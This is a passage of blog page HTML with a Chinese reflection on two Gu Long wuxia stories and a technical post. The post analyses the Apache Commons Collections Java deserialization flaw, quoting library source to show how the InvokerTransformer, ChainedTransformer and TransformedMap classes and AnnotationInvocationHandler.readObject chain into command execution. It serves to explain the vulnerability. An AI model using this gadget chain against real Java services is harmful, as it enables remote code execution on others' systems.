+秋凤梧可以相信他的友情，他的人品，相信他会保守孔雀翎早就失落这个秘密
+但是干系太大，秋凤梧不敢赌，也不能赌
+所以，最后那杯酒
+一个人难免犯错，但是，犯了错，就必须去弥补，甚至是生命
+金开甲说
+1武功本就是入世的，只要你肯用心，无论做什么事的时候，都一样可以锻炼你的武功
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<h3 id="长生剑"><a href="#长生剑" class="headerlink" title="长生剑"></a>长生剑</h3></blockquote>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">天上白玉京</span><br><span class="line">五楼十二城</span><br><span class="line">仙人抚我顶</span><br><span class="line">结发受长生</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">白玉京不在天上，在马上</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">白玉京并不在天上，在马上</span><br><span class="line">他的马鞍已经很陈旧，他的靴子和剑鞘同样陈旧，但他的衣服却是崭新的</span><br><span class="line">他的剑鞘已经敲着马鞍，春风吹在他脸上</span><br><span class="line">他觉得很愉快，很舒服</span><br><span class="line">旧马鞍坐着舒服，旧靴子穿着舒服，旧剑鞘绝不会损伤他的剑锋，新衣服也总是令他觉得精神抖擞，活力充沛</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">白玉京叹道：“一笑倾人城，再笑倾人国。再锋利的剑，只怕也比不上美人的一笑”</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">他骄傲、任性，有时冲动得像是个孩子，有时却又深沉的像是条狐狸</span><br></pre></td></tr></table></figure>
+
+
+<p><del>白玉京因为一个女子，卷入江湖最大黑帮的一场纷争，袁紫霞的笑是致命的，<br>甚至比传说中的孔雀翎还要有效，孔雀翎只能杀人，而她的笑还能玩弄男人。一个行走江湖的女人，能懂得用笑来保护自己，满足自己的私欲，是任何武器和武功比不了的</del></p>
+<p><del>不过，江湖毕竟是江湖，公平在这是最不值钱的，没有一身铁打的功夫，没有足够的心计，又怎能保护好自己，保护好心爱的人</del></p>
+<p>所以，我想这就是古龙为什么会在最后感叹这样的一段话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">重要的是，她就在他身旁，而且永远不会再离开他。这就已够了。 　　</span><br><span class="line"></span><br><span class="line">这就是我说的第一个故事，第一种武器。 　　</span><br><span class="line"></span><br><span class="line">这故事给我们的教训是一无论多锋利的剑，也比不上那动人的一笑。</span><br><span class="line"></span><br><span class="line">所以我说的第一种武器，并不是剑，而是笑，只有笑才能真征服人心。 　　</span><br><span class="line"></span><br><span class="line">所以当你懂得这道理，就应该收起你的剑来多笑一笑！</span><br></pre></td></tr></table></figure>
+
+<p>据说，古龙大叔不仅仅会写书，对于喝酒和女人也是深谙此道，这点我是相信的，没有经历过故事的人，又怎能写出这种趣味和匠心的文字</p>
+<p>白玉京也算是个幸运儿，令万千男儿神魂颠倒的笑容，又怎么能拒绝的了，与心爱的女人，浪迹于天涯，也算是完美的结局了</p>
+<p>写的很乱，也有一些很矛盾的想法，不管怎么说，这都是一部天真但却动人的小说</p>
+<p>在这借用网上一个读者的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">特别是当你心情低沉，对爱情和真诚失去信心的时候，重读读「长生剑」，我知道它不够真实，</span><br><span class="line">但是，当我们读武侠时，岂不本来就是在希冀属于我们的童话？</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<blockquote>
+<h3 id="孔雀翎"><a href="#孔雀翎" class="headerlink" title="孔雀翎"></a>孔雀翎</h3></blockquote>
+</blockquote>
+<p>孔雀翎，是天下第一的暗器，也是天下最美的兵器，纯金打造。当然，它的美不是因为它金光灿灿，而是这些暗器发出来时，美丽的就像孔雀开屏一样，辉煌灿烂。<br>然而，就在你被这种惊人的生灵感动得目瞪神迷时，它已经要了你的性命</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">世上没有任何一种暗器比孔雀翎更可怕，也绝没有任何一种暗器能比孔雀翎更美丽</span><br><span class="line"></span><br><span class="line">没有人能形容它的美丽，也没有人能避开它、招架它</span><br></pre></td></tr></table></figure>
+
+<p>在这个故事中</p>
+<p>武器终归是武器，再厉害也只是个引子</p>
+<p>高立是个杀手</p>
+<p>秋凤梧也是个杀手</p>
+<p>但他们是相互之间是唯一的朋友</p>
+<p>因为他们背叛了同一个组织，有着相似的品质，同时面对了死亡</p>
+<p>并肩面对死亡的男人，一定会成为至交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小武笑了笑，道：”我虽然不喜欢一个人往陷阱里跳，但若有朋友陪着，随便往哪里跳那就没有关系了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">又是黄昏</span><br><span class="line">远山在夕阳中由翠绿变为青灰，泉水流到这里，也渐渐慢了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>双双并不是一个大众眼中的美人，瘦弱、眼盲、发育不全的畸形儿，像一个做的变了形的没人面具</p>
+<p>但她的脸上却没有任何自卑自怜的神色，反而充满了欢乐和自信</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小武说：“她的外貌也许并不美，可是她的心却很美，也许比世上大多数美人都美丽的多。”</span><br></pre></td></tr></table></figure>
+
+<p>他们之间，不存在什么辜负不辜负，正如高立说的，“为了她这样的女人，你无论做什么都是值得的”</p>
+<p>当一个人有了羁绊，为了自己珍爱的东西，他不得不去战斗，他必须去扛起武器</p>
+<p>高立向小武借了孔雀翎，打败了敌人，却没有动用孔雀翎</p>
+<p>这是第二种武器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无论多可怕的武器，也比不上人类的信心</span><br></pre></td></tr></table></figure>
+
+<p>但这并不是故事的结局</p>
+<p>高立用行动证明了他是个有担当的的男人</p>
+<p>秋凤梧可以相信他的友情，他的人品，相信他会保守孔雀翎早就失落这个秘密</p>
+<p>但是干系太大，秋凤梧不敢赌，也不能赌</p>
+<p>所以，最后那杯酒</p>
+<p>一个人难免犯错，但是，犯了错，就必须去弥补，甚至是生命</p>
+<p>金开甲说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">武功本就是入世的，只要你肯用心，无论做什么事的时候，都一样可以锻炼你的武功</span><br></pre></td></tr></table></figure>
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Jul 18 2016 21:00:00 GMT+0800">2016-07-18</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E9%95%BF%E7%94%9F%E5%89%91%E4%B8%8E%E5%AD%94%E9%9B%80%E7%BF%8E/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/JAVA%20Apache-CommonsCollections%20Unserialize%20Vulnerabilities/">
+                        Apache-CommonsCollections Unserialize Vulnerabilities
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        序列化
+是指把 Java 对象转换为字节序列的过程
+便于保存在内存、文件、数据库中
+ObjectOutputStream类的 writeObject() 方法可以实现序列化
+
+反序列化
+是指把字节序列恢复为 Java 对象的过程
+ObjectInputStream 类的 readObject() 方法用于反序列化
+
+
+0x00 Serialize and Unserialize序列化
+是指把 Java 对象转换为字节序列的过程
+便于保存在内存、文件、数据库中
+ObjectOutputStream类的 writeObject() 方法可以实现序列化
+
+反序列化
+是指把字节序列恢复为 Java 对象的过程
+ObjectInputStream 类的 readObject() 方法用于反序列化
+
+0x01 代码分析12345678910111213public interface Transformer &#123;    /**     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged     * @return a transformed object     * @throws ClassCastException (runtime) if the input is the wrong class     * @throws IllegalArgumentException (runtime) if the input is invalid     * @throws FunctorException (runtime) if the transform cannot be completed     */    public Object transform(Object input);&#125;
+接口的作用是 Transforms the input object (leaving it unchanged) into some output object.
+123456789101112131415161718192021222324252627282930public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;    super();    iMethodName = methodName;    iParamTypes = paramTypes;    iArgs = args;&#125;/** * Transforms the input to result by invoking a method on the input. *  * @param input  the input object to transform * @return the transformed result, null if null input */public Object transform(Object input) &#123;    if (input == null) &#123;        return null;    &#125;    try &#123;        Class cls = input.getClass();        Method method = cls.getMethod(iMethodName, iParamTypes);        return method.invoke(input, iArgs);                &#125; catch (NoSuchMethodException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);    &#125; catch (IllegalAccessException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);    &#125; catch (InvocationTargetException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);    &#125;&#125;
+method.invoke(owner, args)：执行该Method.invoke方法的参数是执行这个方法的对象owner，和参数数组args，可以这么理解：owner对象中带有参数args的method方法。返回值是Object，也既是该方法的返回值。
+
+input参数即是反射的对象iMethodName 、iParamTypes 为调用的方法名称以及该方法的参数类型iArgs 为对应方法的参数
+以上参数均可控
+InvokerTransformer继承了Transformer和Serializable接口，通过传入这三个参数通过Java的反射机制可以调用任意函数
+12345678910/**   * Constructor that performs no validation.   * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.   *    * @param constantToReturn  the constant to return each time   */  public ConstantTransformer(Object constantToReturn) &#123;      super();      iConstant = constantToReturn;  &#125;
+
+123456789/** * Transforms the input by ignoring it and returning the stored constant instead. *  * @param input  the input object which is ignored * @return the stored constant */public Object transform(Object input) &#123;    return iConstant;&#125;
+返回iConstant属性参数可控
+1234567891011121314151617181920212223/**     * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.     *      * @param transformers  the transformers to chain, not copied, no nulls     */    public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;    /**     * Transforms the input to result via each decorated transformer     *      * @param object  the input object passed to the first transformer     * @return the transformed result     */    public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;
+传入一个Transformer数组transform()方法是for循环调用Transformer数组的transform方法，参数为object
+这样就可以通过构造包含命令的 ChainedTransformer 对象，然后需要触发 ChainedTransformer 对象的 transform() 方法执行
+12345678910/** * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;. *  * @param value  the value to transform * @return the transformed value * @since Commons Collections 3.1 */protected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;
+TransformedMap 中的 checkSetValue() 方法会触发transform() 
+123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;    return new TransformedMap(map, keyTransformer, valueTransformer);&#125;
+TransformedMap是Map的一个封装，将Map对象转换，当Map参数修改，Transformer就会被调用
+可以首先构造一个 Map 和一个能够执行代码的 ChainedTransformer ，以此生成一个 TransformedMap
+构造好TransformedMap后就需要想办法触发checkSetValue() 函数
+12345678class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;    private final Class&lt;? extends Annotation&gt; type;    private final Map&lt;String, Object&gt; memberValues;    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;        this.type = type;        this.memberValues = memberValues;    &#125;
+
+123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    s.defaultReadObject();    // Check to make sure that types have not evolved incompatibly    AnnotationType annotationType = null;    try &#123;        annotationType = AnnotationType.getInstance(type);    &#125; catch(IllegalArgumentException e) &#123;        // Class is no longer an annotation type; all bets are off        return;    &#125;    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;        String name = memberValue.getKey();        Class&lt;?&gt; memberType = memberTypes.get(name);        if (memberType != null) &#123;  // i.e. member still exists            Object value = memberValue.getValue();            if (!(memberType.isInstance(value) ||                  value instanceof ExceptionProxy)) &#123;                // 此处触发一些列的Transformer                memberValue.setValue(                    new AnnotationTypeMismatchExceptionProxy(                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                            annotationType.members().get(name)));            &#125;        &#125;    &#125;&#125;
+readObject()函数中对memberValues的每一项调用了setValue()函数
+1234public Object setValue(Object value) &#123;    value = parent.checkSetValue(value);    return entry.setValue(value);&#125;
+setValue()会触发checkSetValue()
+所以构造 AnnotationInvocationHandler时进行序列化，当触发 readObject() 反序列化的时候，就能实现命令执行
+参考：http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/https://security.tencent.com/index.php/blog/msg/97http://drops.wooyun.org/papers/10467http://drops.wooyun.org/papers/13244
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>序列化</p>
+<pre><code>是指把 Java 对象转换为字节序列的过程
+便于保存在内存、文件、数据库中
+ObjectOutputStream类的 writeObject() 方法可以实现序列化
+</code></pre>
+<p>反序列化</p>
+<pre><code>是指把字节序列恢复为 Java 对象的过程
+ObjectInputStream 类的 readObject() 方法用于反序列化
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="15193958514875.jpg"></p>
+<h4 id="0x00-Serialize-and-Unserialize"><a href="#0x00-Serialize-and-Unserialize" class="headerlink" title="0x00 Serialize and Unserialize"></a>0x00 Serialize and Unserialize</h4><p>序列化</p>
+<pre><code>是指把 Java 对象转换为字节序列的过程
+便于保存在内存、文件、数据库中
+ObjectOutputStream类的 writeObject() 方法可以实现序列化
+</code></pre>
+<p>反序列化</p>
+<pre><code>是指把字节序列恢复为 Java 对象的过程
+ObjectInputStream 类的 readObject() 方法用于反序列化
+</code></pre>
+<h4 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line">    /**</span><br><span class="line">     * Transforms the input object (leaving it unchanged) into some output object.</span><br><span class="line">     *</span><br><span class="line">     * @param input  the object to be transformed, should be left unchanged</span><br><span class="line">     * @return a transformed object</span><br><span class="line">     * @throws ClassCastException (runtime) if the input is the wrong class</span><br><span class="line">     * @throws IllegalArgumentException (runtime) if the input is invalid</span><br><span class="line">     * @throws FunctorException (runtime) if the transform cannot be completed</span><br><span class="line">     */</span><br><span class="line">    public Object transform(Object input);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接口的作用是 Transforms the input object (leaving it unchanged) into some output object.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">    super();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Transforms the input to result by invoking a method on the input.</span><br><span class="line"> * </span><br><span class="line"> * @param input  the input object to transform</span><br><span class="line"> * @return the transformed result, null if null input</span><br><span class="line"> */</span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        return method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>method.invoke(owner, args)：执行该Method.invoke方法的参数是执行这个方法的对象owner，和参数数组args，可以这么理解：owner对象中带有参数args的method方法。返回值是Object，也既是该方法的返回值。
+</code></pre>
+<p>input参数即是反射的对象<br>iMethodName 、iParamTypes 为调用的方法名称以及该方法的参数类型<br>iArgs 为对应方法的参数</p>
+<p>以上参数均可控</p>
+<p>InvokerTransformer继承了Transformer和Serializable接口，通过传入这三个参数通过Java的反射机制可以调用任意函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">   * Constructor that performs no validation.</span><br><span class="line">   * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span><br><span class="line">   * </span><br><span class="line">   * @param constantToReturn  the constant to return each time</span><br><span class="line">   */</span><br><span class="line">  public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">      super();</span><br><span class="line">      iConstant = constantToReturn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Transforms the input by ignoring it and returning the stored constant instead.</span><br><span class="line"> * </span><br><span class="line"> * @param input  the input object which is ignored</span><br><span class="line"> * @return the stored constant</span><br><span class="line"> */</span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    return iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>返回iConstant属性<br>参数可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Constructor that performs no validation.</span><br><span class="line">     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span><br><span class="line">     * </span><br><span class="line">     * @param transformers  the transformers to chain, not copied, no nulls</span><br><span class="line">     */</span><br><span class="line">    public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">        super();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Transforms the input to result via each decorated transformer</span><br><span class="line">     * </span><br><span class="line">     * @param object  the input object passed to the first transformer</span><br><span class="line">     * @return the transformed result</span><br><span class="line">     */</span><br><span class="line">    public Object transform(Object object) &#123;</span><br><span class="line">        for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>传入一个Transformer数组<br>transform()方法是for循环调用Transformer数组的transform方法，参数为object</p>
+<p>这样就可以通过构造包含命令的 ChainedTransformer 对象，然后需要触发 ChainedTransformer 对象的 transform() 方法执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span><br><span class="line"> * </span><br><span class="line"> * @param value  the value to transform</span><br><span class="line"> * @return the transformed value</span><br><span class="line"> * @since Commons Collections 3.1</span><br><span class="line"> */</span><br><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>TransformedMap 中的 checkSetValue() 方法会触发transform() </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>TransformedMap是Map的一个封装，将Map对象转换，当Map参数修改，Transformer就会被调用</p>
+<p>可以首先构造一个 Map 和一个能够执行代码的 ChainedTransformer ，以此生成一个 TransformedMap</p>
+<p>构造好TransformedMap后就需要想办法触发checkSetValue() 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private final Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        this.type = type;</span><br><span class="line">        this.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Check to make sure that types have not evolved incompatibly</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        // Class is no longer an annotation type; all bets are off</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||</span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                // 此处触发一些列的Transformer</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>readObject()函数中对memberValues的每一项调用了setValue()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public Object setValue(Object value) &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    return entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>setValue()会触发checkSetValue()</p>
+<p>所以构造 AnnotationInvocationHandler时进行序列化，当触发 readObject() 反序列化的时候，就能实现命令执行</p>
+<p>参考：<br><a class="link" target="_blank" rel="noopener" href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/97">https://security.tencent.com/index.php/blog/msg/97<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/10467">http://drops.wooyun.org/papers/10467<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/13244">http://drops.wooyun.org/papers/13244<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
